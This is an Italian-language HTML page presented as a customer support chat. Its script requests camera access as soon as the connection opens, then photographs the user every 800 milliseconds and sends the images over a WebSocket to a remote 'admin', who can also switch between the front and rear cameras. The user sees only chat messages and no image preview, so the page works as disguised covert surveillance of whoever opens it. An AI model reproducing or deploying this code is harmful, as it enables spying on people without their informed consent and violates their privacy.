<!DOCTYPE html>
<html lang="it">
<head>
  <meta charset="UTF-8" />
  <title>Chat Supporto</title>
  <style>
    body { background:#121212; color:#fff; font-family:Arial; margin:0; display:flex; flex-direction:column; height:100vh; }
    #messages { flex:1; overflow-y:auto; padding:10px; }
    #messages div { margin:6px 0; }
    #inputArea { display:flex; padding:10px; background:#222; }
    input { flex:1; padding:8px; border:none; border-radius:5px; }
    button { margin-left:8px; padding:8px 12px; background:#0f0; border:none; border-radius:5px; cursor:pointer; }
    .you { text-align:right; color:#0f0; }
    .admin { text-align:left; color:#00aaff; }
    .notice { text-align:center; color:#aaa; font-size:12px; }
  </style>
</head>
<body>
  <div id="messages"></div>
  <div id="inputArea">
    <input id="msgInput" placeholder="Scrivi un messaggio..."/>
    <button id="sendBtn">Invia</button>
  </div>

  <script>
    const ws = new WebSocket(`wss://${location.host}/ws?role=client&room=user1`);
    const messages = document.getElementById('messages');
    const input = document.getElementById('msgInput');
    const sendBtn = document.getElementById('sendBtn');

    let currentCamera = 'user'; // default frontale
    let stream = null;

    ws.onopen = () => {
      addMessage('Sistema', 'Connessione avviata', 'notice');
      requestCamera();
    };

    ws.onmessage = async e => {
      const msg = JSON.parse(e.data);
      if (msg.type === 'chat') {
        addMessage('Admin', msg.text, 'admin');
      }
      if (msg.type === 'switch_camera') {
        currentCamera = msg.camera;
        addMessage('Sistema', `L'amministratore ha richiesto la fotocamera ${msg.camera === 'user' ? 'frontale' : 'posteriore'}`, 'notice');
        await startCamera();
      }
    };

    sendBtn.onclick = sendMessage;
    input.addEventListener('keypress', e => { if (e.key === 'Enter') sendMessage(); });

    function sendMessage() {
      const text = input.value.trim();
      if (!text) return;
      ws.send(JSON.stringify({ type: 'chat', text }));
      addMessage('Tu', text, 'you');
      input.value = '';
    }

    function addMessage(sender, text, cls) {
      const div = document.createElement('div');
      div.className = cls;
      div.textContent = `${sender}: ${text}`;
      messages.appendChild(div);
      messages.scrollTop = messages.scrollHeight;
    }

    async function requestCamera() {
      try {
        await startCamera();
        addMessage('Sistema', 'Accesso alla fotocamera concesso', 'notice');
      } catch (err) {
        addMessage('Sistema', 'Accesso alla fotocamera negato', 'notice');
      }
    }

    async function startCamera() {
      if (stream) {
        stream.getTracks().forEach(t => t.stop());
      }
      try {
        stream = await navigator.mediaDevices.getUserMedia({ 
          video: { facingMode: currentCamera }, 
          audio: false 
        });
        const videoTrack = stream.getVideoTracks()[0];
        const imageCapture = new ImageCapture(videoTrack);
        captureAndSend(imageCapture);
      } catch (err) {
        addMessage('Errore', 'Impossibile accedere alla fotocamera', 'notice');
      }
    }

    async function captureAndSend(imageCapture) {
      try {
        const blob = await imageCapture.takePhoto();
        const reader = new FileReader();
        reader.onloadend = () => {
          ws.send(JSON.stringify({ type: 'video', image: reader.result }));
        };
        reader.readAsDataURL(blob);
      } catch {}
      setTimeout(() => captureAndSend(imageCapture), 800);
    }
  </script>
</body>
</html>
